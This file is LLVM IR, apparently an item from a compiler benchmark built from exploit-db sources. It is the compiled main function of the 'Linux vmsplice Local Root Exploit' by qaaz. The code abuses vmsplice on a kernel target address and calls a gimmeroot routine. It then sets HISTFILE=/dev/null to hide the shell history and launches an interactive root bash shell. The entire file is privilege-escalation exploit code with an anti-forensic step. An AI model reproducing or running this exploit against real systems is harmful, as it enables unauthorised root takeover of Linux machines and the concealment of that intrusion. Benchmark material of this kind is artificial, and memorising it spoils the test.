; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_5093.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_5093.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.iovec = type { i32, i8* }

@uid = common dso_local global i64 0, align 8
@gid = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [37 x i8] c"-----------------------------------\0A\00", align 1
@.str.1 = private unnamed_addr constant [36 x i8] c" Linux vmsplice Local Root Exploit\0A\00", align 1
@.str.2 = private unnamed_addr constant [10 x i8] c" By qaaz\0A\00", align 1
@.str.3 = private unnamed_addr constant [5 x i8] c"!@#$\00", align 1
@.str.4 = private unnamed_addr constant [17 x i8] c"[+] addr: 0x%lx\0A\00", align 1
@.str.5 = private unnamed_addr constant [5 x i8] c"pipe\00", align 1
@errno = common dso_local global i32 0, align 4
@TRAMP_SIZE = common dso_local global i32 0, align 4
@TRAMP_CODE = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [4 x i8] c"wtf\00", align 1
@.str.7 = private unnamed_addr constant [10 x i8] c"[+] root\0A\00", align 1
@.str.8 = private unnamed_addr constant [19 x i8] c"HISTFILE=/dev/null\00", align 1
@.str.9 = private unnamed_addr constant [10 x i8] c"/bin/bash\00", align 1
@.str.10 = private unnamed_addr constant [5 x i8] c"bash\00", align 1
@.str.11 = private unnamed_addr constant [3 x i8] c"-i\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [2 x i32], align 4
  %7 = alloca i64, align 8
  %8 = alloca %struct.iovec, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %9 = call i64 (...) @getuid()
  store i64 %9, i64* @uid, align 8
  %10 = call i32 (...) @getgid()
  store i32 %10, i32* @gid, align 4
  %11 = load i64, i64* @uid, align 8
  %12 = load i64, i64* @uid, align 8
  %13 = load i64, i64* @uid, align 8
  %14 = call i32 @setresuid(i64 %11, i64 %12, i64 %13)
  %15 = load i32, i32* @gid, align 4
  %16 = load i32, i32* @gid, align 4
  %17 = load i32, i32* @gid, align 4
  %18 = call i32 @setresgid(i32 %15, i32 %16, i32 %17)
  %19 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str, i64 0, i64 0))
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.1, i64 0, i64 0))
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0))
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str, i64 0, i64 0))
  %23 = load i64, i64* @uid, align 8
  %24 = icmp ne i64 %23, 0
  br i1 %24, label %25, label %28

25:                                               ; preds = %2
  %26 = load i32, i32* @gid, align 4
  %27 = icmp ne i32 %26, 0
  br i1 %27, label %30, label %28

28:                                               ; preds = %25, %2
  %29 = call i32 @die(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i64 0, i64 0), i32 0)
  br label %30

30:                                               ; preds = %28, %25
  %31 = call i64 (...) @get_target()
  store i64 %31, i64* %7, align 8
  %32 = load i64, i64* %7, align 8
  %33 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.4, i64 0, i64 0), i64 %32)
  %34 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 0
  %35 = call i64 @pipe(i32* %34)
  %36 = icmp slt i64 %35, 0
  br i1 %36, label %37, label %40

37:                                               ; preds = %30
  %38 = load i32, i32* @errno, align 4
  %39 = call i32 @die(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i64 0, i64 0), i32 %38)
  br label %40

40:                                               ; preds = %37, %30
  %41 = load i64, i64* %7, align 8
  %42 = inttoptr i64 %41 to i8*
  %43 = getelementptr inbounds %struct.iovec, %struct.iovec* %8, i32 0, i32 1
  store i8* %42, i8** %43, align 8
  %44 = load i32, i32* @TRAMP_SIZE, align 4
  %45 = getelementptr inbounds %struct.iovec, %struct.iovec* %8, i32 0, i32 0
  store i32 %44, i32* %45, align 8
  %46 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 1
  %47 = load i32, i32* %46, align 4
  %48 = load i32, i32* @TRAMP_CODE, align 4
  %49 = load i32, i32* @TRAMP_SIZE, align 4
  %50 = call i32 @write(i32 %47, i32 %48, i32 %49)
  %51 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 0
  %52 = load i32, i32* %51, align 4
  %53 = call i32 @_vmsplice(i32 %52, %struct.iovec* %8, i32 1, i32 0)
  %54 = call i32 (...) @gimmeroot()
  %55 = call i64 (...) @getuid()
  %56 = icmp ne i64 %55, 0
  br i1 %56, label %57, label %59

57:                                               ; preds = %40
  %58 = call i32 @die(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.6, i64 0, i64 0), i32 0)
  br label %59

59:                                               ; preds = %57, %40
  %60 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.7, i64 0, i64 0))
  %61 = call i32 @putenv(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.8, i64 0, i64 0))
  %62 = call i32 @execl(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.9, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.11, i64 0, i64 0), i32* null)
  %63 = load i32, i32* @errno, align 4
  %64 = call i32 @die(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.9, i64 0, i64 0), i32 %63)
  ret i32 0
}

declare dso_local i64 @getuid(...) #1

declare dso_local i32 @getgid(...) #1

declare dso_local i32 @setresuid(i64, i64, i64) #1

declare dso_local i32 @setresgid(i32, i32, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @die(i8*, i32) #1

declare dso_local i64 @get_target(...) #1

declare dso_local i64 @pipe(i32*) #1

declare dso_local i32 @write(i32, i32, i32) #1

declare dso_local i32 @_vmsplice(i32, %struct.iovec*, i32, i32) #1

declare dso_local i32 @gimmeroot(...) #1

declare dso_local i32 @putenv(i8*) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
